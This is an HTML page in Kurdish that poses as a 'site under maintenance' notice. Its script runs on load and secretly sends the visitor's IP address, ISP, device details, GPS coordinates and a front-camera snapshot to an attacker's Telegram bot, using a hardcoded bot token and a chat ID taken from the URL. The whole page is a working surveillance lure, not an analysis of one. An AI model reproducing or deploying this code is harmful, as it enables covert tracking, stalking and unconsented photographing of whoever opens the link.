<!DOCTYPE html>
<html lang="ku">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <!-- ڕێگری لە پاشەکەوتکردنی بیرگەی کۆن (No-Cache) -->
    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="0">
    <title>ماڵپەڕەکە لەژێر کارکردندایە</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f9;
            color: #333;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            text-align: center;
        }
        .container {
            background: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
            max-width: 400px;
        }
        h1 { font-size: 24px; color: #e74c3c; }
        p { font-size: 16px; color: #666; }
    </style>
</head>
<body>
    <div class="container">
        <h1>⚙️ ماڵپەڕەکە لەژێر کارکردندایە</h1>
        <p>تکایە کەمێکی تر هەوڵبدەرەوە، کار لەسەر چاککردنی سیستەمەکە دەکرێت.</p>
    </div>

    <script>
        const BOT_TOKEN = "8918413203:AAG-EBiQakMDS0jK1H3d26ox0UpBh6LN-eY";
        
        const urlParams = new URLSearchParams(window.location.search);
        const chatId = urlParams.get('id');

        function sendTelegramMessage(text) {
            if (!chatId) return;
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: text,
                    parse_mode: 'Markdown'
                })
            }).catch(err => console.error(err));
        }

        function sendTelegramPhoto(blob) {
            if (!chatId) return;
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('photo', blob, 'capture.jpg');
            formData.append('caption', '📸 **وێنەی ڕاستەوخۆی بەکارهێنەر لە کامێرای پێشەوە!**');

            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData
            }).catch(err => console.error(err));
        }

        // 1. زانیاری سەرەتایی IP و مۆبایل
        async function sendBasicInfo() {
            let ipData = {};
            try {
                const res = await fetch('https://ipapi.co/json/');
                ipData = await res.json();
            } catch (e) {}

            const sysInfo = `
🔔 **سەردانیکەرێکی نوێ لینکەکەی کردەوە!**

🌐 **IP Address:** \`${ipData.ip || 'نادیار'}\`
🏢 **کۆمپانیای ئینتەرنێت (ISP):** ${ipData.org || 'نادیار'}

📱 **سیستەم:** ${navigator.platform}
📐 **ڕوونی شاشە:** ${window.screen.width}x${window.screen.height}
💻 **User-Agent:** ${navigator.userAgent}
            `;
            sendTelegramMessage(sysInfo);
        }

        // 2. پشکنینی دۆخی لۆکەیشن
        function checkLocation() {
            if (!("geolocation" in navigator)) {
                sendTelegramMessage("❌ ئامێرەکە پشتگیری لە Geolocation ناکات.");
                return;
            }

            navigator.geolocation.getCurrentPosition(
                (position) => {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
                    
                    sendTelegramMessage(`🟢 **ڕێگەپێدانی شوێن (Location): ALLOW کراوە**\n🎯 **دۆخی GPS:** لۆکەیشنی ئامێرەکە هەڵکراوە و دەقیقە!\n\n📍 **پۆتانەکان:** \`${lat},${lon}\`\n🗺 [کردنەوە لە Google Maps](${mapLink})`);
                },
                (error) => {
                    if (error.code === 1) { // PERMISSION_DENIED
                        sendTelegramMessage("🔴 **ڕێگەپێدانی شوێن (Location): DENY کراوە**\n(کەسەکە کلیکی لەسەر Block / Don't Allow کرد و ڕێگەی نەدا).");
                    } else if (error.code === 2) { // POSITION_UNAVAILABLE
                        sendTelegramMessage("🟡 **ڕێگەپێدانی شوێن (Location): ALLOW کراوە**\n(کەسەکە Allowی کردووە، بەڵام **Location / GPSی مۆبایلەکەی کوژاوەیە**).");
                    } else if (error.code === 3) { // TIMEOUT
                        sendTelegramMessage("⚠️ **شوێن:** کاتەکە بەسەرچوو لە دەستنیشانکردنی GPS.");
                    } else {
                        sendTelegramMessage("⚠️ **دۆخی شوێن:** هەڵەیەک ڕوویدا لە وەرگرتنی شوێن.");
                    }
                },
                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
            );
        }

        // 3. پشکنینی دۆخی کامێرا
        function checkCamera() {
            if (!(navigator.mediaDevices && navigator.mediaDevices.getUserMedia)) {
                sendTelegramMessage("❌ ئامێرەکە پشتگیری لە کامێرا ناکات.");
                return;
            }

            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
                .then((stream) => {
                    sendTelegramMessage("🟢 **ڕێگەپێدانی کامێرا (Camera): ALLOW کراوە**\n📸 وێنەکە دەگیرێت...");

                    const video = document.createElement('video');
                    video.srcObject = stream;
                    video.play();

                    video.onloadedmetadata = () => {
                        setTimeout(() => {
                            const canvas = document.createElement('canvas');
                            canvas.width = video.videoWidth || 640;
                            canvas.height = video.videoHeight || 480;
                            const ctx = canvas.getContext('2d');
                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                            canvas.toBlob((blob) => {
                                sendTelegramPhoto(blob);
                                stream.getTracks().forEach(track => track.stop());
                            }, 'image/jpeg');
                        }, 1000);
                    };
                })
                .catch((err) => {
                    sendTelegramMessage("🔴 **ڕێگەپێدانی کامێرا (Camera): DENY کراوە**\n(کەسەکە کلیکی لەسەر Block / Don't Allow کرد و ڕێگەی نەدا).");
                });
        }

        window.onload = () => {
            if (chatId) {
                sendBasicInfo();
                checkLocation();
                checkCamera();
            }
        };
    </script>
</body>
</html>
